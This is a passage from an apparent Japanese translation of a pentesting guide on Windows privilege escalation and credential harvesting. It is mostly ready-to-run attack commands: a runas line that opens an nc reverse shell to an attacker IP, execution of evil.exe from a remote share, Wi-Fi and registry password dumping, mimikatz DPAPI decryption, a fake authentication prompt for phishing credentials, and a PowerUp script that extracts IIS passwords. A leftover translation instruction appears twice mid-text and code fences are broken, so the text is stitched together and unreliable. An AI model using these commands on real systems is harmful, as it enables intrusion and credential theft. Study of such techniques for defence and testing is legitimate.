type C:\Windows\System32\drivers\etc\hosts
```
### ネットワークインターフェース & DNS
```
ipconfig /all
Get-NetIPConfiguration | ft InterfaceAlias,InterfaceDescription,IPv4Address
Get-DnsClientServerAddress -AddressFamily IPv4 | ft
```
### オープンポート

外部からの**制限されたサービス**を確認する
```bash
netstat -ano #Opened ports?
```
### ルーティングテーブル
```
route print
Get-NetRoute -AddressFamily IPv4 | ft DestinationPrefix,NextHop,RouteMetric,ifIndex
```
### ARP テーブル
```
arp -A
Get-NetNeighbor -AddressFamily IPv4 | ft ifIndex,IPAddress,L
```
### ファイアウォールルール

[**ファイアウォールに関連するコマンドについてはこのページをチェックしてください**](../basic-cmd-for-pentesters.md#firewall) **(ルールのリスト、ルールの作成、オフにする、オフにする...)**

その他の[ネットワーク列挙に関するコマンドはこちら](../basic-cmd-for-pentesters.md#network)

### Windows Subsystem for Linux (wsl)
```
C:\Windows\System32\bash.exe
C:\Windows\System32\wsl.exe
```
```markdown
バイナリ `bash.exe` は `C:\Windows\WinSxS\amd64_microsoft-windows-lxssbash_[...]\bash.exe` で見つけることができます。

rootユーザーを取得した場合、任意のポートでリッスンすることができます（`nc.exe` を使用してポートでリッスンする最初の時、ファイアウォールによって `nc` が許可されるべきかどうかGUI経由で尋ねられます）。
```
```
wsl whoami
./ubuntun1604.exe config --default-user root
wsl whoami
wsl python -c 'BIND_OR_REVERSE_SHELL_PYTHON_CODE'
```
```markdown
簡単にrootとしてbashを起動するには、`--default-user root` を試してみてください。

`WSL` ファイルシステムは、フォルダ `C:\Users\%USERNAME%\AppData\Local\Packages\CanonicalGroupLimited.UbuntuonWindows_79rhkp1fndgsc\LocalState\rootfs\` で探索できます。

## Windows 資格情報

### Winlogon 資格情報
```
```bash
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2>nul | findstr /i "DefaultDomainName DefaultUserName DefaultPassword AltDefaultDomainName AltDefaultUserName AltDefaultPassword LastUsedUsername"

#Other way
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultPassword
```
### 資格情報マネージャー / Windows ボールト

[https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault](https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault)より\
Windows ボールトは、**Windows**がユーザーを**自動的にログイン**させるためのサーバー、ウェブサイト、その他のプログラムのユーザー資格情報を保存します。初見では、ユーザーがFacebook、Twitter、Gmailなどの資格情報を保存し、ブラウザー経由で自動的にログインできるように見えるかもしれませんが、そうではありません。

Windows ボールトは、Windowsがユーザーを自動的にログインできる資格情報を保存します。これは、リソース（サーバーまたはウェブサイト）へのアクセスに資格情報が必要な**Windows アプリケーションがこの資格情報マネージャー**とWindows ボールトを利用し、ユーザーが毎回ユーザー名とパスワードを入力する代わりに供給された資格情報を使用できることを意味します。

アプリケーションが資格情報マネージャーと対話しない限り、指定されたリソースの資格情報を使用することは不可能だと思います。したがって、アプリケーションがボールトを利用したい場合、何らかの方法で**資格情報マネージャーと通信し、デフォルトのストレージボールトからそのリソースの資格情報を要求する**必要があります。

マシンに保存されている資格情報を一覧表示するには、`cmdkey`を使用します。
```
cmdkey /list
Currently stored credentials:
Target: Domain:interactive=WORKGROUP\Administrator
Type: Domain Password
User: WORKGROUP\Administrator
```
その後、保存された資格情報を使用するために、`runas` を `/savecred` オプションと共に使用できます。次の例は、SMB共有を介してリモートバイナリを呼び出しています。
```bash
runas /savecred /user:WORKGROUP\Administrator "\\10.XXX.XXX.XXX\SHARE\evil.exe"
```
`runas` を提供されたクレデンシャルセットで使用する。
```bash
C:\Windows\System32\runas.exe /env /noprofile /user:<username> <password> "c:\users\Public\nc.exe -nc <attacker-ip> 4444 -e cmd.exe"
```
```
### DPAPI

理論的には、Data Protection APIはあらゆる種類のデータの対称暗号化を可能にすることができますが、実際には、Windowsオペレーティングシステムでの主な使用目的は、ユーザーまたはシステムの秘密をエントロピーの重要な寄与として使用して、非対称プライベートキーの対称暗号化を行うことです。

**DPAPIは開発者がユーザーのログオンシークレットから派生した対称キーを使用してキーを暗号化することを可能にします**、またはシステム暗号化の場合は、システムのドメイン認証シークレットを使用します。

ユーザーのRSAキーを暗号化するために使用されるDPAPIキーは、`%APPDATA%\Microsoft\Protect\{SID}`ディレクトリに格納されています。ここで{SID}はそのユーザーの[セキュリティ識別子](https://en.wikipedia.org/wiki/Security\_Identifier)です。**DPAPIキーは、ユーザーのプライベートキーを保護するマスターキーと同じファイルに格納されています**。通常はランダムデータの64バイトです。（このディレクトリは保護されているため、`dir`コマンドを使用してリストすることはできませんが、PSからはリストできます）。
```
```
Get-ChildItem  C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem  C:\Users\USER\AppData\Local\Microsoft\Protect\
```
```markdown
**mimikatzモジュール** `dpapi::masterkey` を適切な引数 (`/pvk` または `/rpc`) と共に使用して、それを復号化できます。

**マスターパスワードで保護された資格情報ファイル** は通常、以下の場所にあります:
```
```
dir C:\Users\username\AppData\Local\Microsoft\Credentials\
dir C:\Users\username\AppData\Roaming\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Local\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Roaming\Microsoft\Credentials\
```
以下は、Windowsの強化に関するハッキング技術についてのハッキング書籍の内容です。関連する英語テキストを日本語に翻訳し、まったく同じマークダウンおよびHTML構文を保持して翻訳を返してください。コード、ハッキング技術名、ハッキング用語、クラウド/SaaSプラットフォーム名（Workspace、aws、gcpなど）、'leak'という単語、ペネトレーションテスト、およびマークダウンタグなどは翻訳しないでください。また、翻訳とマークダウン構文以外の余分なものは追加しないでください。

---

**mimikatzモジュール** `dpapi::cred` を適切な `/masterkey` と共に使用して復号化できます。
**多くのDPAPI** **マスターキー**を `sekurlsa::dpapi` モジュールで**メモリ**から抽出できます（root権限がある場合）。

{% content-ref url="dpapi-extracting-passwords.md" %}
[dpapi-extracting-passwords.md](dpapi-extracting-passwords.md)
{% endcontent-ref %}

### PowerShellクレデンシャル

**PowerShellクレデンシャル**は、暗号化されたクレデンシャルを便利に保存する方法として、**スクリプト**や自動化タスクによく使用されます。クレデンシャルは**DPAPI**を使用して保護されており、通常はそれらが作成された同じユーザーによって、同じコンピューター上でのみ復号化できることを意味します。

ファイルに含まれるPSクレデンシャルを**復号化**するには、次の操作を行います：
```
PS C:\> $credential = Import-Clixml -Path 'C:\pass.xml'
PS C:\> $credential.GetNetworkCredential().username

john

PS C:\htb> $credential.GetNetworkCredential().password

JustAPWD!
```
### Wifi

Wifi関連の情報を取得することは、ローカルプリビレッジエスカレーションに役立つことがあります。例えば、保存されているWifiパスワードを取得することができます。
```bash
#List saved Wifi using
netsh wlan show profile
#To get the clear-text password use
netsh wlan show profile <SSID> key=clear
#Oneliner to extract all wifi passwords
cls & echo. & for /f "tokens=3,* delims=: " %a in ('netsh wlan show profiles ^| find "Profile "') do @echo off > nul & (netsh wlan show profiles name="%b" key=clear | findstr "SSID Cipher Content" | find /v "Number" & echo.) & @echo on*
```
### 保存されたRDP接続

これらは `HKEY_USERS\<SID>\Software\Microsoft\Terminal Server Client\Servers\`\
および `HKCU\Software\Microsoft\Terminal Server Client\Servers\` で見つけることができます。

### 最近実行されたコマンド
```
HCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
HKCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
```
### **リモートデスクトップ資格情報マネージャー**
```
%localappdata%\Microsoft\Remote Desktop Connection Manager\RDCMan.settings
```
以下は、Windowsのハードニングに関するハッキング技術についてのハッキングの本の内容です。関連する英語のテキストを日本語に翻訳し、まったく同じマークダウンおよびHTML構文を保持して翻訳を返してください。コード、ハッキング技術名、ハッキング用語、クラウド/SaaSプラットフォーム名（Workspace、aws、gcpなど）、'leak'という単語、ペネトレーションテスト、およびマークダウンタグなどは翻訳しないでください。また、翻訳とマークダウン構文以外の余分なものは追加しないでください。

**Mimikatz** `dpapi::rdg` モジュールを適切な `/masterkey` と共に使用して、任意の .rdg ファイルを**復号化**します。\
Mimikatz `sekurlsa::dpapi` モジュールを使用して、メモリから多くのDPAPIマスターキーを**抽出**できます。

### Sticky Notes

人々はしばしば、Windowsワークステーション上のStickyNotesアプリを使用して**パスワード**やその他の情報を保存しますが、これがデータベースファイルであることに気づいていません。このファイルは `C:\Users\<user>\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite` にあり、常に検索して調査する価値があります。

### AppCmd.exe

**AppCmd.exeからパスワードを回復するには、管理者であり、High Integrityレベルで実行する必要があることに注意してください。**\
**AppCmd.exe** は `%systemroot%\system32\inetsrv\` ディレクトリにあります。\
このファイルが存在する場合、何らかの**資格情報**が設定されており、**回復**可能である可能性があります。

このコードは _**PowerUP**_ から抽出されました：
```bash
function Get-ApplicationHost {
$OrigError = $ErrorActionPreference
$ErrorActionPreference = "SilentlyContinue"

# Check if appcmd.exe exists
if (Test-Path  ("$Env:SystemRoot\System32\inetsrv\appcmd.exe")) {
# Create data table to house results
$DataTable = New-Object System.Data.DataTable

# Create and name columns in the data table
$Null = $DataTable.Columns.Add("user")
$Null = $DataTable.Columns.Add("pass")
$Null = $DataTable.Columns.Add("type")
$Null = $DataTable.Columns.Add("vdir")
$Null = $DataTable.Columns.Add("apppool")

# Get list of application pools
Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppools /text:name" | ForEach-Object {

# Get application pool name
$PoolName = $_

# Get username
$PoolUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.username"
$PoolUser = Invoke-Expression $PoolUserCmd

# Get password
$PoolPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.password"
$PoolPassword = Invoke-Expression $PoolPasswordCmd

# Check if credentials exists
if (($PoolPassword -ne "") -and ($PoolPassword -isnot [system.array])) {
# Add credentials to database
$Null = $DataTable.Rows.Add($PoolUser, $PoolPassword,'Application Pool','NA',$PoolName)
}
}

# Get list of virtual directories
Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir /text:vdir.name" | ForEach-Object {

# Get Virtual Directory Name
$VdirName = $_

# Get username
$VdirUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:userName"
$VdirUser = Invoke-Expression $VdirUserCmd

# Get password
$VdirPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:password"
$VdirPassword = Invoke-Expression $VdirPasswordCmd

# Check if credentials exists
if (($VdirPassword -ne "") -and ($VdirPassword -isnot [system.array])) {
# Add credentials to database
$Null = $DataTable.Rows.Add($VdirUser, $VdirPassword,'Virtual Directory',$VdirName,'NA')
}
}

# Check if any passwords were found
if( $DataTable.rows.Count -gt 0 ) {
# Display results in list view that can feed into the pipeline
$DataTable |  Sort-Object type,user,pass,vdir,apppool | Select-Object user,pass,type,vdir,apppool -Unique
}
else {
# Status user
Write-Verbose 'No application pool or virtual directory passwords were found.'
$False
}
}
else {
Write-Verbose 'Appcmd.exe does not exist in the default location.'
$False
}
$ErrorActionPreference = $OrigError
}
```
### SCClient / SCCM

`C:\Windows\CCM\SCClient.exe`が存在するか確認してください。\
インストーラーは**SYSTEM権限で実行されます**。多くは**DLL Sideloadingに対して脆弱です（情報源：**[**https://github.com/enjoiz/Privesc**](https://github.com/enjoiz/Privesc)**）。**
```bash
$result = Get-WmiObject -Namespace "root\ccm\clientSDK" -Class CCM_Application -Property * | select Name,SoftwareVersion
if ($result) { $result }
else { Write "Not Installed." }
```
## ファイルとレジストリ（クレデンシャル）

### Putty Creds
```bash
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s | findstr "HKEY_CURRENT_USER HostName PortNumber UserName PublicKeyFile PortForwardings ConnectionSharing ProxyPassword ProxyUsername" #Check the values saved in each session, user/password could be there
```
### Putty SSH ホストキー
```
reg query HKCU\Software\SimonTatham\PuTTY\SshHostKeys\
```
### レジストリ内のSSHキー

SSHの秘密鍵はレジストリキー `HKCU\Software\OpenSSH\Agent\Keys` 内に保存されることがあるため、そこに何か興味深いものがないか確認する必要があります。
```
reg query HKEY_CURRENT_USER\Software\OpenSSH\Agent\Keys
```
そのパス内に何かエントリーが見つかった場合、それはおそらく保存されたSSHキーです。暗号化されて保存されていますが、[https://github.com/ropnop/windows\_sshagent\_extract](https://github.com/ropnop/windows\_sshagent\_extract)を使用して簡単に復号化できます。
このテクニックに関する詳細はこちらです: [https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)

`ssh-agent` サービスが実行されていない場合、ブート時に自動的に開始するようにするには、次のコマンドを実行します：
```
Get-Service ssh-agent | Set-Service -StartupType Automatic -PassThru | Start-Service
```
{% hint style="info" %}
この技術はもはや有効ではないようです。SSHキーを作成し、`ssh-add`で追加して、SSH経由でマシンにログインしようとしました。レジストリHKCU\Software\OpenSSH\Agent\Keysは存在せず、非対称キー認証中に`dpapi.dll`の使用をprocmonが特定できませんでした。
{% endhint %}

### 放置されたファイル
```
C:\Windows\sysprep\sysprep.xml
C:\Windows\sysprep\sysprep.inf
C:\Windows\sysprep.inf
C:\Windows\Panther\Unattended.xml
C:\Windows\Panther\Unattend.xml
C:\Windows\Panther\Unattend\Unattend.xml
C:\Windows\Panther\Unattend\Unattended.xml
C:\Windows\System32\Sysprep\unattend.xml
C:\Windows\System32\Sysprep\unattended.xml
C:\unattend.txt
C:\unattend.inf
dir /s *sysprep.inf *sysprep.xml *unattended.xml *unattend.xml *unattend.txt 2>nul
```
```markdown
metasploitを使用してこれらのファイルを検索することもできます: **metasploit**: _post/windows/gather/enum\_unattend_

例の内容_:\_
```
```markup
<component name="Microsoft-Windows-Shell-Setup" publicKeyToken="31bf3856ad364e35" language="neutral" versionScope="nonSxS" processorArchitecture="amd64">
<AutoLogon>
<Password>U2VjcmV0U2VjdXJlUGFzc3dvcmQxMjM0Kgo==</Password>
<Enabled>true</Enabled>
<Username>Administrateur</Username>
</AutoLogon>

<UserAccounts>
<LocalAccounts>
<LocalAccount wcm:action="add">
<Password>*SENSITIVE*DATA*DELETED*</Password>
<Group>administrators;users</Group>
<Name>Administrateur</Name>
</LocalAccount>
</LocalAccounts>
</UserAccounts>
```
### SAM & SYSTEM バックアップ
```bash
# Usually %SYSTEMROOT% = C:\Windows
%SYSTEMROOT%\repair\SAM
%SYSTEMROOT%\System32\config\RegBack\SAM
%SYSTEMROOT%\System32\config\SAM
%SYSTEMROOT%\repair\system
%SYSTEMROOT%\System32\config\SYSTEM
%SYSTEMROOT%\System32\config\RegBack\system
```
### クラウド認証情報
```bash
#From user home
.aws\credentials
AppData\Roaming\gcloud\credentials.db
AppData\Roaming\gcloud\legacy_credentials
AppData\Roaming\gcloud\access_tokens.db
.azure\accessTokens.json
.azure\azureProfile.json
```
### McAfee SiteList.xml

**SiteList.xml** というファイルを探します。

### キャッシュされたGPPパスワード

KB2928120（MS14-025を参照）以前には、グループポリシーの設定でカスタムアカウントを設定することができました。この機能は主に、マシンのグループにカスタムローカル管理者アカウントを展開するために使用されていました。ただし、このアプローチには2つの問題がありました。まず、グループポリシーオブジェクトはSYSVOL内のXMLファイルとして保存されるため、どのドメインユーザーでもそれらを読むことができます。2つ目の問題は、これらのGPPで設定されたパスワードがデフォルトキーでAES256暗号化されており、そのキーは公開文書化されています。これは、認証されたユーザーが非常に機密性の高いデータにアクセスし、自分のマシンやドメインで権限を昇格させる可能性があることを意味します。この機能は、ローカルにキャッシュされたGPPファイルに空でない「cpassword」フィールドが含まれているかどうかをチェックします。もしそうなら、それを復号化し、GPPに関する情報とファイルの場所を含むカスタムPSオブジェクトを返します。

これらのファイルは `C:\ProgramData\Microsoft\Group Policy\history` または _**C:\Documents and Settings\All Users\Application Data\Microsoft\Group Policy\history** (W Vista以前)_ で探します：

* Groups.xml
* Services.xml
* Scheduledtasks.xml
* DataSources.xml
* Printers.xml
* Drives.xml

**cPasswordを復号化するには：**
```bash
#To decrypt these passwords you can decrypt it using
gpp-decrypt j1Uyj3Vx8TY9LtLZil2uAuZkFQA/4latT76ZwgdHdhw
```
```
crackmapexecを使用してパスワードを取得する:
```
```shell-session
crackmapexec smb 10.10.10.10 -u username -p pwd -M gpp_autologin
```
### IIS Web構成
```bash
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```

```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config
C:\inetpub\wwwroot\web.config
```

```
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
Get-Childitem –Path C:\xampp\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```
```markdown
クレデンシャルを含むweb.configの例:
```
```markup
<authentication mode="Forms">
<forms name="login" loginUrl="/admin">
<credentials passwordFormat = "Clear">
<user name="Administrator" password="SuperAdminPassword" />
</credentials>
</forms>
</authentication>
```
### OpenVPN 認証情報
```csharp
Add-Type -AssemblyName System.Security
$keys = Get-ChildItem "HKCU:\Software\OpenVPN-GUI\configs"
$items = $keys | ForEach-Object {Get-ItemProperty $_.PsPath}

foreach ($item in $items)
{
$encryptedbytes=$item.'auth-data'
$entropy=$item.'entropy'
$entropy=$entropy[0..(($entropy.Length)-2)]

$decryptedbytes = [System.Security.Cryptography.ProtectedData]::Unprotect(
$encryptedBytes,
$entropy,
[System.Security.Cryptography.DataProtectionScope]::CurrentUser)

Write-Host ([System.Text.Encoding]::Unicode.GetString($decryptedbytes))
}
```
### ログ
```bash
# IIS
C:\inetpub\logs\LogFiles\*

#Apache
Get-Childitem –Path C:\ -Include access.log,error.log -File -Recurse -ErrorAction SilentlyContinue
```
### 資格情報を求める

常に**ユーザーに自分の資格情報、あるいは他のユーザーの資格情報を入力するよう求める**ことができます（直接クライアントに**資格情報**を**求める**ことは非常に**リスキー**であることに注意してください）：
```bash
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\'+[Environment]::UserName,[Environment]::UserDomainName); $cred.getnetworkcredential().password
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\'+'anotherusername',[Environment]::UserDomainName); $cred.getnetworkcredential().password

#Get plaintext
$cred.GetNetworkCredential() | fl
```
### **資格情報が含まれている可能性のあるファイル名**

**パスワード**が**平文**または**Base64**で含まれていたことがある既知のファイル
```bash
$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history
vnc.ini, ultravnc.ini, *vnc*
web.config
php.ini httpd.conf httpd-xampp.conf my.ini my.cnf (XAMPP, Apache, PHP)
SiteList.xml #McAfee
ConsoleHost_history.txt #PS-History
*.gpg
*.pgp
*config*.php
elasticsearch.y*ml
kibana.y*ml
*.p12
*.der
*.csr
*.cer
known_hosts
id_rsa
id_dsa
*.ovpn
anaconda-ks.cfg
hostapd.conf
rsyncd.conf
cesi.conf
supervisord.conf
tomcat-users.xml
*.kdbx
KeePass.config
Ntds.dit
SAM
SYSTEM
FreeSSHDservice.ini
access.log
error.log
server.xml
ConsoleHost_history.txt
setupinfo
setupinfo.bak
key3.db         #Firefox
key4.db         #Firefox
places.sqlite   #Firefox
"Login Data"    #Chrome
Cookies         #Chrome
Bookmarks       #Chrome
History         #Chrome
TypedURLsTime   #IE
TypedURLs       #IE
%SYSTEMDRIVE%\pagefile.sys
%WINDIR%\debug\NetSetup.log
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software, %WINDIR%\repair\security
%WINDIR%\iis6.log
%WINDIR%\system32\config\AppEvent.Evt
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
%WINDIR%\system32\CCM\logs\*.log
%USERPROFILE%\ntuser.dat
%USERPROFILE%\LocalS~1\Tempor~1\Content.IE5\index.dat
```
提案されたすべてのファイルを検索します：
```
cd C:\
dir /s/b /A:-D RDCMan.settings == *.rdg == *_history* == httpd.conf == .htpasswd == .gitconfig == .git-credentials == Dockerfile == docker-compose.yml == access_tokens.db == accessTokens.json == azureProfile.json == appcmd.exe == scclient.exe == *.gpg$ == *.pgp$ == *config*.php == elasticsearch.y*ml == kibana.y*ml == *.p12$ == *.cer$ == known_hosts == *id_rsa* == *id_dsa* == *.ovpn == tomcat-users.xml == web.config == *.kdbx == KeePass.config == Ntds.dit == SAM == SYSTEM == security == software == FreeSSHDservice.ini == sysprep.inf == sysprep.xml == *vnc*.ini == *vnc*.c*nf* == *vnc*.txt == *vnc*.xml == php.ini == https.conf == https-xampp.conf == my.ini == my.cnf == access.log == error.log == server.xml == ConsoleHost_history.txt == pagefile.sys == NetSetup.log == iis6.log == AppEvent.Evt == SecEvent.Evt == default.sav == security.sav == software.sav == system.sav == ntuser.dat == index.dat == bash.exe == wsl.exe 2>nul | findstr /v ".dll"
```

```
Get-Childitem –Path C:\ -Include *unattend*,*sysprep* -File -Recurse -ErrorAction SilentlyContinue | where {($_.Name -like "*.xml" -or $_.Name -like "*.txt" -or $_.Name -like "*.ini")}
```
### ゴミ箱内の資格情報

ゴミ箱内に資格情報がないかも確認するべきです

複数のプログラムによって保存された**パスワードを復元**するには、次を使用できます: [http://www.nirsoft.net/password\_recovery\_tools.html](http://www.nirsoft.net/password\_recovery\_tools.html)

### レジストリ内部

**資格情報が含まれる可能性のあるその他のレジストリキー**
```bash
reg query "HKCU\Software\ORL\WinVNC3\Password"
reg query "HKLM\SYSTEM\CurrentControlSet\Services\SNMP" /s
reg query "HKCU\Software\TightVNC\Server"
reg query "HKCU\Software\OpenSSH\Agent\Key"
```
[**レジストリからopensshキーを抽出する。**](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)

### ブラウザの履歴

**ChromeやFirefox**に保存されているパスワードのデータベースをチェックするべきです。\
また、ブラウザの履歴、ブックマーク、お気に入りもチェックし、そこに**パスワードが**保存されている可能性があります。

ブラウザからパスワードを抽出するツール:

* Mimikatz: `dpapi::chrome`
* [**SharpWeb**](https://github.com/djhohnstein/SharpWeb)
* [**SharpChromium**](https://github.com/djhohnstein/SharpChromium)
* [**SharpDPAPI**](https://github.com/GhostPack/SharpDPAPI)****

### **COM DLL 上書き**

**Component Object Model (COM)** は、異なる言語のソフトウェアコンポーネント間の**相互通信**を可能にするWindowsオペレーティングシステム内に組み込まれた技術です。各COMコンポーネントは**クラスID (CLSID)** を介して識別され、各コンポーネントは一つ以上のインターフェースを介して機能を公開し、これらはインターフェースID (IIDs) を介して識別されます。

COMクラスとインターフェースは、それぞれ**HKEY\_**_**CLASSES\_**_**ROOT\CLSID** と **HKEY\_**_**CLASSES\_**_**ROOT\Interface** の下のレジストリで定義されています。このレジストリは **HKEY\_**_**LOCAL\_**_**MACHINE\Software\Classes** + **HKEY\_**_**CURRENT\_**_**USER\Software\Classes** = **HKEY\_**_**CLASSES\_**_**ROOT** をマージして作成されます。

このレジストリのCLSIDs内には、**DLL**を指す**デフォルト値**と、**Apartment**（シングルスレッド）、**Free**（マルチスレッド）、**Both**（シングルまたはマルチ）、**Neutral**（スレッドニュートラル）のいずれかである**ThreadingModel**という値を含む**InProcServer32**という子レジストリがあります。

![](<../../.gitbook/assets/image (638).png>)

基本的に、実行される予定の**DLLのいずれかを上書きできれば**、異なるユーザーによってそのDLLが実行される場合に**権限を昇格**することができます。

攻撃者がCOM Hijackingを永続化メカニズムとしてどのように使用するかを学ぶには、以下をチェックしてください:

{% content-ref url="com-hijacking.md" %}
[com-hijacking.md](com-hijacking.md)
{% endcontent-ref %}

### **ファイルとレジストリ内の汎用パスワード検索**

**ファイル内容の検索**
```bash
cd C:\ & findstr /SI /M "password" *.xml *.ini *.txt
findstr /si password *.xml *.ini *.txt *.config
findstr /spin "password" *.*
```
**特定のファイル名を持つファイルを検索する**
```bash
dir /S /B *pass*.txt == *pass*.xml == *pass*.ini == *cred* == *vnc* == *.config*
where /R C:\ user.txt
where /R C:\ *.ini
```
**レジストリを検索してキー名とパスワードを探す**
```bash
REG QUERY HKLM /F "password" /t REG_SZ /S /K
REG QUERY HKCU /F "password" /t REG_SZ /S /K
REG QUERY HKLM /F "password" /t REG_SZ /S /d
REG QUERY HKCU /F "password" /t REG_SZ /S /d
```
### パスワードを検索するツール

[**MSF-Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials) は私が作成した**msf**プラグインで、被害者の中で資格情報を検索するすべてのmetasploit POSTモジュールを**自動的に実行します**。\
[**Winpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) はこのページに記載されているパスワードが含まれているすべてのファイルを自動的に検索します。\
[**Lazagne**](https://github.com/AlessandroZ/LaZagne) はシステムからパスワードを抽出する別の優れたツールです。

ツール [**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) は、プレーンテキストでこのデータを保存するいくつかのツール（PuTTY, WinSCP, FileZilla, SuperPuTTY, RDP）の**セッション**、**ユーザー名**、**パスワード**を検索します。
```bash
Import-Module path\to\SessionGopher.ps1;
Invoke-SessionGopher -Thorough
Invoke-SessionGopher -AllDomain -o
Invoke-SessionGopher -AllDomain -u domain.com\adm-arvanaghi -p s3cr3tP@ss
```
## リークされたハンドラ

**SYSTEMとして実行されているプロセスが新しいプロセスを開く** (`OpenProcess()`) 場合、**完全なアクセス権**を持っています。同じプロセスは**低権限で新しいプロセスを作成する** (`CreateProcess()`) **が、メインプロセスのすべてのオープンハンドルを継承します**。\
その後、**低権限のプロセスに完全なアクセス権がある場合**、`OpenProcess()`で作成された**特権プロセスへのオープンハンドルを掴む**ことができ、**シェルコードを注入する**ことができます。\
[この例を読んで、**この脆弱性を検出して利用する方法**について詳しく知る](leaked-handle-exploitation.md)\
[**さまざまな権限レベル（完全アクセス権限だけでなく）で継承されたプロセスとスレッドのより多くのオープンハンドラをテストして悪用する方法についてのより完全な説明については、この他の投稿を読む**](http://dronesec.pw/blog/2019/08/22/exploiting-leaked-process-and-thread-handles/)

## 名前付きパイプクライアントのなりすまし

`pipe`は、プロセスが通信とデータ交換に使用できる共有メモリのブロックです。

`Named Pipes`は、関連性のない2つのプロセスがデータを交換できるようにするWindowsのメカニズムであり、プロセスが異なる2つのネットワーク上にある場合でも機能します。クライアント/サーバーアーキテクチャに非常に似ており、`named pipe server`や`named pipe client`といった概念が存在します。

**クライアントがパイプに書き込むと**、パイプを作成した**サーバー**は、**SeImpersonate**権限を持っていれば、**クライアント**を**なりすます**ことができます。その後、あなたがなりすますことができる任意のパイプに書き込む予定の**特権プロセスを見つけることができれば**、そのプロセスがあなたが作成したパイプ内に書き込んだ後、そのプロセスをなりすまして**権限を昇格**することができるかもしれません。[**この攻撃を実行する方法を学ぶにはこれを読む**](named-pipe-client-impersonation.md) **または** [**これ**](./#from-high-integrity-to-system)**。**

**また、以下のツールを使用して、burpのようなツールで名前付きパイプ通信を傍受することができます:** [**https://github.com/gabriel-sztejnworcel/pipe-intercept**](https://github.com/gabriel-sztejnworcel/pipe-intercept) **そして、このツールを使用して、privescsを見つけるためにすべてのパイプをリストアップして表示することができます** [**https://github.com/cyberark/PipeViewer**](https://github.com/cyberark/PipeViewer)****

## その他

### **パスワードのためのコマンドライン監視**

ユーザーとしてシェルを取得すると、スケジュールされたタスクや他のプロセスが実行されている可能性があり、**コマンドラインで資格情報を渡している**場合があります。以下のスクリプトは、2秒ごとにプロセスのコマンドラインをキャプチャし、現在の状態と前の状態を比較し、違いがあれば出力します。
```powershell
while($true)
{
$process = Get-WmiObject Win32_Process | Select-Object CommandLine
Start-Sleep 1
$process2 = Get-WmiObject Win32_Process | Select-Object CommandLine
Compare-Object -ReferenceObject $process -DifferenceObject $process2
}
```
## 低権限ユーザーからNT\AUTHORITY SYSTEMへの昇格 (CVE-2019-1388) / UACバイパス

グラフィカルインターフェース（コンソールまたはRDP経由）にアクセスでき、UACが有効になっている場合、Microsoft Windowsの一部のバージョンでは、特権のないユーザーから「NT\AUTHORITY SYSTEM」としてターミナルや他のプロセスを実行することが可能です。

これにより、同じ脆弱性を利用して権限を昇格させ、同時にUACをバイパスすることができます。さらに、何もインストールする必要がなく、プロセス中に使用されるバイナリは、Microsoftによって署名され発行されています。

影響を受けるシステムの一部は以下の通りです：
```
SERVER
======

Windows 2008r2	7601	** link OPENED AS SYSTEM **
Windows 2012r2	9600	** link OPENED AS SYSTEM **
Windows 2016	14393	** link OPENED AS SYSTEM **
Windows 2019	17763	link NOT opened


WORKSTATION
===========

Windows 7 SP1	7601	** link OPENED AS SYSTEM **
Windows 8		9200	** link OPENED AS SYSTEM **
Windows 8.1		9600	** link OPENED AS SYSTEM **
Windows 10 1511	10240	** link OPENED AS SYSTEM **
Windows 10 1607	14393	** link OPENED AS SYSTEM **
Windows 10 1703	15063	link NOT opened
Windows 10 1709	16299	link NOT opened
```
